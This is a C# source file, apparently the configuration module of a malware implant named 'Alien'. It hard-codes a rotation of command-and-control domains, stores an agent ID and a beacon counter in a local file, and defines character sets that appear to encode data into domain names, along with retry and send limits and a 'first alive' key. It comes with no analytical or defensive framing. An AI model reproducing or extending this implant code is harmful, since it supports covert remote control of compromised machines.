using System;
using System.Collections.Generic;
using System.IO;

namespace Alien
{
	public class Config
	{
		public static void Init()
		{
			if (!Config._Load())
			{
				Config._Counter = RandomManager.GetRandomRange(0, Config._MaxCounter);
				Config._Save();
			}
			Config._Domains = new string[]
			{
				"gitwork.com",
				"revenge.com",
				"skillrush.com"
			};
			TaskClass.ListData = new List<byte[]>();
		}

		public static void SetAgentID(int agentID)
		{
			Config._AgentID = new int?(agentID);
			Config._Save();
		}

		public static void IncreaseCounter()
		{
			Config._Counter++;
			if (Config._Counter >= Config._MaxCounter)
			{
				Config._Counter = 0;
			}
			Config._Save();
		}

		public static int GetCounter()
		{
			return Config._Counter;
		}

		public static int? GetAgentID()
		{
			return Config._AgentID;
		}

		private static bool _Save()
		{
			try
			{
				string content = (Config._AgentID != null) ? Config._AgentID.Value.ToString() : "-";
				content += Environment.NewLine;
				content += Config._Counter.ToString();
				File.WriteAllText(
					"cnf", 
					content
				);
			}
			catch (Exception ex)
			{
				Util.Log(ex.ToString());
				return false;
			}
			return true;
		}

		private static bool _Load()
		{
			try
			{
				string[] array = File.ReadAllLines("cnf");
				if (array[0] != "-")
				{
					Config._AgentID = new int?(int.Parse(array[0]));
				}
				Config._Counter = int.Parse(array[1]);
			}
			catch (Exception ex)
			{
				Util.Log(ex.ToString());
				return false;
			}
			return true;
		}

		internal static string GetDomain()
		{
			int randomRange = RandomManager.GetRandomRange(0, Config._Domains.Length - 1);
			return Config._Domains[randomRange];
		}

		public static int MaxTry = 7;
		public static int SendCount = 12;
		public static string CharsDomain = "abcdefghijklmnopqrstuvwxyz0123456789";
		public static string CharsCounter = "razupgnv2w01eos4t38h7yqidxmkljc6b9f5";
		public static string FirstAliveKey = "simpsons";

		
		private static string[] _Domains;
		private static int? _AgentID = null;
		private static int _Counter;
		private static int _MaxCounter = 46656;
	}
}
